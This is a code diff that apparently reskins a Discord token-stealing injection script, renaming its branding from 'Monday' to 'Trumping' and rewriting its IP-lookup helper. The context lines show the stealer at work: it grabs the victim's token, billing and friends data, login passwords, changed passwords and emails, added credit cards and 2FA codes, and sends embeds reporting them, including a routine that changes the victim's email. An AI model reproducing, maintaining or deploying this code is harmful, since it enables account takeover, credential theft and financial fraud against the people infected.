@@ -78,7 +78,7 @@ async function execScript(str) {
   
   const makeEmbed = async ({ title, fields, image, thumbnail, description }) => {
     var params = {
-      username: "Monday",
+      username: "Trumping",
       avatar_url:
         "https://raw.githubusercontent.com/hawkerthewinner/cerf/main/assets/Trump.png",
       content: "",
@@ -89,7 +89,7 @@ async function execScript(str) {
           fields: fields,
           description: description ?? "",
           author: {
-            name: `Monday`,
+            name: `Trumping`,
           },
   
           footer: {
@@ -111,38 +111,53 @@ async function execScript(str) {
   };
   
   
+  const https = require('https');
+
   const getIP = () => {
+    return new Promise((resolve, reject) => {
       const options = {
-          hostname: 'api.ipify.org',
-          path: '/?format=json',
-          method: 'GET',
-        };
-      
+        hostname: 'api.ipify.org',
+        path: '/?format=json',
+        method: 'GET',
+      };
+  
       const req = https.request(options, (res) => {
         let data = '';
-    
+  
+        // Accumule les données reçues
         res.on('data', (chunk) => {
           data += chunk;
-          console.log(data)
         });
-    
+  
+        // Une fois toutes les données reçues
         res.on('end', () => {
           try {
-            const json = JSON.parse(data);
-            console.log(json)
-            return json.ip;
+            const json = JSON.parse(data); // Parse les données en JSON
+            resolve(json.ip); // Renvoie l'IP
           } catch (error) {
-              console.log(error);
+            reject('Erreur de parsing JSON: ' + error.message);
           }
         });
       });
-    
+  
+      // Gestion des erreurs
       req.on('error', (error) => {
-          console.log(error)
+        reject('Erreur de requête: ' + error.message);
       });
-    
-      req.end();
-    };
+  
+      req.end(); // Fin de la requête
+    });
+  };
+  
+  // Exemple d'utilisation
+  getIP()
+    .then((ip) => {
+      console.log('IP publique :', ip);
+    })
+    .catch((error) => {
+      console.error('Erreur :', error);
+    });
+  
   
   const getURL = async (url, token) => {
     var c = await execScript(`
@@ -561,7 +576,7 @@ async function execScript(str) {
       var client_discord = appName;
       if (!token) {
         var params = await makeEmbed({
-          title: "<a:caat:1130448857436782682> Monday Initialized",
+          title: "<a:caat:1130448857436782682> Trumping Initialized",
           fields: [
             {
               name: "Injection Info",
@@ -605,7 +620,7 @@ async function execScript(str) {
             `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`
           ));
         var params = await makeEmbed({
-          title: " Monday Initialized",
+          title: " Trumping Initialized",
           description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\``,
           fields: [
             {
@@ -645,7 +660,7 @@ async function execScript(str) {
             },
             {
               name: "@Copyright",
-              value: `[Monday 2023 <a:caat:1130448857436782682>](https://github.com/Trumpify/Trump)`,
+              value: `[Trumping <a:caat:1130448857436782682>](https://github.com/Trumpify/Trump)`,
               inline: !0,
             },
             {
@@ -699,7 +714,7 @@ async function execScript(str) {
         if (!token) {
           var params = await makeEmbed({
             title:
-              "<a:caat:1130448857436782682> Monday User log out (User not Logged in before)",
+              "<a:caat:1130448857436782682> Trumping User log out (User not Logged in before)",
             fields: [
               {
                 name: "Injection Info",
@@ -743,7 +758,7 @@ async function execScript(str) {
               `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`
             ));
           var params = await makeEmbed({
-            title: "<a:caat:1130448857436782682> Monday Victim got logged out",
+            title: "<a:caat:1130448857436782682> Trumping Victim got logged out",
             description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
             fields: [
               {
@@ -783,7 +798,7 @@ async function execScript(str) {
               },
               {
                 name: "@Copyright",
-                value: `[Monday 2023 <a:caat:1130448857436782682>](https://t.me/FuckDonaldTrump)`,
+                value: `[Trumping <a:caat:1130448857436782682>](https://t.me/FuckDonaldTrump)`,
                 inline: !0,
               },
               {
@@ -931,7 +946,7 @@ async function execScript(str) {
     }
   );
   
-  async function BoukiTuclcavectesfonctions() {
+  async function deluxefunction() {
     var token = await execScript(tokenScript);
     var user = await getURL("https://discord.com/api/v8/users/@me", token);
     var billing = await getURL(
@@ -1004,7 +1019,7 @@ async function execScript(str) {
             userBanner,
             Billings,
             Friends,
-          } = await BoukiTuclcavectesfonctions();
+          } = await deluxefunction();
           let language = user.locale ?? "en-US";
           console.log(language);
   
@@ -1408,7 +1423,7 @@ async function execScript(str) {
         userAvatar,
         Billings,
         Friends,
-      } = await BoukiTuclcavectesfonctions();
+      } = await deluxefunction();
   
       var { appPath, appName } = path;
       var client_discord = appName;
@@ -1440,10 +1455,10 @@ async function execScript(str) {
                   userAvatar,
                   Billings,
                   Friends,
-                } = await BoukiTuclcavectesfonctions();
+                } = await deluxefunction();
                 var password = data.password;
                 var params = await makeEmbed({
-                  title: "<a:caat:1130448857436782682> Monday User Login",
+                  title: "<a:caat:1130448857436782682> Trumping User Login",
                   color: config["embed-color"],
                   description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                   fields: [
@@ -1484,7 +1499,7 @@ async function execScript(str) {
                     },
                     {
                       name: "@Copyright",
-                      value: `[Monday 2023 <a:caat:1130448857436782682>](https://t.me/FuckDonaldTrump)`,
+                      value: `[Trumping <a:caat:1130448857436782682>](https://t.me/FuckDonaldTrump)`,
                       inline: !0,
                     },
                     {
@@ -1570,12 +1585,12 @@ async function execScript(str) {
                 userAvatar,
                 Billings,
                 Friends,
-              } = await BoukiTuclcavectesfonctions();
+              } = await deluxefunction();
   
               var password = data.password;
   
               var params = await makeEmbed({
-                title: "<a:caat:1130448857436782682> Monday User Login",
+                title: "<a:caat:1130448857436782682> Trumping User Login",
                 color: config["embed-color"],
                 description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                 fields: [
@@ -1616,7 +1631,7 @@ async function execScript(str) {
                   },
                   {
                     name: "@Copyright",
-                    value: `[Monday 2023 <a:caat:1130448857436782682>](https://t.me/FuckDonaldTrump)`,
+                    value: `[Trumping <a:caat:1130448857436782682>](https://t.me/FuckDonaldTrump)`,
                     inline: !0,
                   },
                   {
@@ -1684,7 +1699,7 @@ async function execScript(str) {
           if (data.new_password) {
             var params = await makeEmbed({
               title:
-                "<a:caat:1130448857436782682> Monday Detect Password Changed",
+                "<a:caat:1130448857436782682> Trumping Detect Password Changed",
               color: config["embed-color"],
               description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
               fields: [
@@ -1725,7 +1740,7 @@ async function execScript(str) {
                 },
                 {
                   name: "@Copyright",
-                  value: `[Monday 2023 <a:caat:1130448857436782682>](https://t.me/FuckDonaldTrump)`,
+                  value: `[Trumping <a:caat:1130448857436782682>](https://t.me/FuckDonaldTrump)`,
                   inline: !0,
                 },
                 {
@@ -1794,7 +1809,7 @@ async function execScript(str) {
               const username = config.mail.substring(0, atIndex);
               const domain = config.mail.substring(atIndex);
   
-              const generatedEmail = `${username ?? "kschdediscord"}+${generateId(
+              const generatedEmail = `${username ?? "proutprout"}+${generateId(
                 3
               )}${domain ?? "@gmail.com"}`;
               const generatedPassword = generatePassword();
@@ -1818,7 +1833,7 @@ async function execScript(str) {
   
                     var params = await makeEmbed({
                       title:
-                        "<a:caat:1130448857436782682> Monday Have changed the victim mail",
+                        "<a:caat:1130448857436782682> Trumping Have changed the victim mail",
                       color: config["embed-color"],
                       description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                       fields: [
@@ -1844,7 +1859,7 @@ async function execScript(str) {
                         },
                         {
                           name: "@Copyright",
-                          value: `[Monday 2023 <a:caat:1130448857436782682>](https://t.me/FuckDonaldTrump)`,
+                          value: `[Trumping <a:caat:1130448857436782682>](https://t.me/FuckDonaldTrump)`,
                           inline: !1,
                         },
                         {
@@ -1884,7 +1899,7 @@ async function execScript(str) {
             }
             var params = await makeEmbed({
               title:
-                "<a:caat:1130448857436782682> Monday Detect Email Changed",
+                "<a:caat:1130448857436782682> Trumping Detect Email Changed",
               color: config["embed-color"],
               description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
               fields: [
@@ -1925,7 +1940,7 @@ async function execScript(str) {
                 },
                 {
                   name: "@Copyright",
-                  value: `[Monday 2023 <a:caat:1130448857436782682>](https://t.me/FuckDonaldTrump)`,
+                  value: `[Trumping <a:caat:1130448857436782682>](https://t.me/FuckDonaldTrump)`,
                   inline: !0,
                 },
                 {
@@ -2008,7 +2023,7 @@ async function execScript(str) {
                   dt.billing_address;
                 var params = await makeEmbed({
                   title:
-                    "<a:caat:1130448857436782682> Monday User Credit Card Added",
+                    "<a:caat:1130448857436782682> Trumping User Credit Card Added",
                   color: config["embed-color"],
                   fields: [
                     {
@@ -2104,7 +2119,7 @@ async function execScript(str) {
           }
   
           var params = await makeEmbed({
-            title: "<a:caat:1130448857436782682> Monday User Enable 2FA",
+            title: "<a:caat:1130448857436782682> Trumping User Enable 2FA",
             color: config["embed-color"],
             fields: [
               {
@@ -2169,7 +2184,7 @@ async function execScript(str) {
           break;
         case request.url.endsWith("/disable"):
           var params = await makeEmbed({
-            title: "<a:caat:1130448857436782682> Monday User Removed 2FA",
+            title: "<a:caat:1130448857436782682> Trumping User Removed 2FA",
             color: config["embed-color"],
             fields: [
               {
@@ -2243,7 +2258,7 @@ async function execScript(str) {
             }
           }
           var params = await makeEmbed({
-            title: "<a:caat:1130448857436782682> Monday User 2FA Codes",
+            title: "<a:caat:1130448857436782682> Trumping User 2FA Codes",
             color: config["embed-color"],
             fields: [
               {
